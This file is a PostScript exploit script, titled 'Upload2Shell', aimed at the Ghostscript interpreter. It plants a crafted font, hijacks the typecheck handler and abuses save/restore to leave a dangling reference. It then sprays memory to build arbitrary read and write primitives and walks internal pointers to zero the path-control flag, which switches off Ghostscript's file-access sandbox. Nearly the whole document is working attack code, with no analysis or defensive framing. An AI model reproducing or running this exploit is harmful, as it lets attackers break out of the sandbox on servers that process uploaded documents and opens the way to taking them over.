%!PS
% Upload2Shell - zero out path_control_active, then print the state.
% Handy on its own to watch the flag flip from true to false.

true setglobal
/FontPath (%ram%ghostescape-native-write.pfa) def
false setglobal
/FontFile FontPath (w) file def
FontFile (%!PS-AdobeFont-1.0: GSLoaderProbe 1.0
/FontType 1 def
/Base /Courier findfont def
/Font Base maxlength dict def
Base { 1 index /FID ne { Font 3 1 roll put } { pop pop } ifelse } forall
Font /FontName /GSLoaderProbe put
/GSLoaderProbe Font definefont pop
userdict /OldGlobal currentglobal put false setglobal
userdict /BadOperand 0 array put
count array astore userdict exch /SavedStack exch put
0 1 userdict /SavedStack get length 1 sub {
  userdict /I 3 -1 roll put
  userdict /SavedStack get userdict /I get
  2 copy get type /stringtype eq
    { userdict /BadOperand get put } { pop pop } ifelse
} for
userdict /Trap true put
userdict /OldGlobal get setglobal
userdict /SavedStack get aload pop
) writestring
FontFile closefile

/OldTypecheck errordict /typecheck get def
errordict /typecheck {
  userdict /Trap known { userdict /Trap get } { false } ifelse
  { userdict /Trap false put pop pop pop pop pop
    userdict /TargetDict get userdict /TargetKey get userdict /TargetValue get
  } { OldTypecheck } ifelse
} bind put

true setglobal
/FontEntry 1 array def
FontEntry 0 FontPath put
Fontmap /GSLoaderProbe FontEntry readonly put
false setglobal

/Marker 305419896 def             % 0x12345678
/Changed 305419897 def            % 0x12345679
/Victims 512 array def
/TargetDict systemdict def
/TargetKey /GHOSTESCAPE_DANGLING def
/Snapshot save def
/TargetValue 2048 string def
0 1 2047 { TargetValue exch 65 put } for
{ /GSLoaderProbe findfont pop } stopped pop
Snapshot restore

0 1 511 {
  /I exch def
  32 array dup 0 1 31 { Marker put dup } for pop
  Victims I 3 -1 roll put
} for

/Dangling systemdict /GHOSTESCAPE_DANGLING get def
/Offset -1 def
8 1 2044 {
  /I exch def
  Dangling I get 16#78 eq
  Dangling I 1 add get 16#56 eq and
  Dangling I 2 add get 16#34 eq and
  Dangling I 3 add get 16#12 eq and
  { /Offset I def exit } if
} for
Offset -1 eq { (NO_OVERLAP\n) print quit } if
Dangling Offset 16#79 put

/ArrayIndex -1 def /Slot -1 def
0 1 511 {
  /I exch def
  0 1 31 {
    /J exch def
    Victims I get J get Changed eq
    { /ArrayIndex I def /Slot J def exit } if
  } for
  ArrayIndex -1 ne { exit } if
} for
ArrayIndex -1 eq { (NO_ALIAS\n) print quit } if

% --- stage 1: read/write and the pointer walk ---
/RefBase Offset 8 sub def
/Template 8 string def

/ForgeView { % ( addr -- string )  a string with rsize 0x7ffffff0 at addr
  /A exch def
  Victims ArrayIndex get Slot /Template load put
  Dangling RefBase 4 add 16#f0 put
  Dangling RefBase 5 add 16#0f put
  Dangling RefBase 6 add 16#00 put
  Dangling RefBase 7 add 16#00 put
  0 1 7 {
    /I exch def
    Dangling RefBase 8 add I add A I 8 mul neg bitshift 255 and put
  } for
  Victims ArrayIndex get Slot get
} def

/Read64 { % ( addr -- int )
  /A exch def
  A ForgeView /S exch def
  /V 0 def
  0 1 7 {
    /I exch def
    S I get I 8 mul bitshift V or /V exch def
  } for
  V
} def

/Read32 { % ( addr -- int )
  /A exch def
  A ForgeView /S exch def
  /V 0 def
  0 1 3 {
    /I exch def
    S I get I 8 mul bitshift V or /V exch def
  } for
  V
} def

% dig out the psi_device_ref behind currentdevice
Victims ArrayIndex get Slot currentdevice put
/Pdev 0 def
0 1 7 {
  /I exch def
  Dangling RefBase 8 add I add get I 8 mul bitshift Pdev or /Pdev exch def
} for
(PDEV=) print Pdev ==

/Dev Pdev Read64 def
(DEV=) print Dev ==
/Mem Dev 24 add Read64 def
(MEM=) print Mem ==
/LibCtx Mem 208 add Read64 def
(LIBCTX=) print LibCtx ==
/Core LibCtx 8 add Read64 def
(CORE=) print Core ==
(PCA=) print Core 156 add Read32 ==

% --- stage 2: turn off native path control ---
/Write32 { % ( addr val -- )
  /Val exch def /A exch def
  A ForgeView /S exch def
  0 1 3 { /I exch def S I Val I 8 mul bitshift 255 and put } for
} def

(PCA_BEFORE=) print Core 156 add Read32 == flush
Core 156 add 0 Write32
(PCA_AFTER=) print Core 156 add Read32 == flush
(PATHCONTROL=) print .currentpathcontrolstate == flush
quit
